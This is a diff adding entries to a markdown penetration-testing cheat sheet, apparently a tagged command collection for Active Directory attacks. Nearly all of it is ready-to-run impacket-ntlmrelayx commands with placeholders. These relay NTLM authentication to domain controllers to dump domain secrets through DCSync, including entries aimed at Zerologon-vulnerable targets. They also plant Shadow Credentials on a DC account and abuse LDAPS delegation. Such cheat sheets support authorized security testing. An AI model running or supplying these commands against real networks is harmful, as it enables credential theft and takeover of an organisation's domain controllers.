@@ -73,3 +73,22 @@ impacket-ntlmrelayx -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
 ```
 impacket-ntlmrelayx -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
 ```
+
+## ntlmrelay - target vulnerable to Zerologon, dump DC's secrets only
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+```
+impacket-ntlmrelayx -t dcsync://'<DOMAINCONTROLLER>'
+```
+
+## ntlmrelay - target vulnerable to Zerologon ,dump Domain's secrets
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+```
+impacket-ntlmrelayx -t dcsync://'<DOMAINCONTROLLER>' -auth-smb '<DOMAIN>'/'<LOW_PRIV_USER>':'<PASSWORD>'
+```
+
+
+## ntlmrelay - Shadow Credentials
+
+```
+impacket-ntlmrelayx -t ldap://<dc02> --shadow-credentials --shadow-target '<dc01>$'
+```
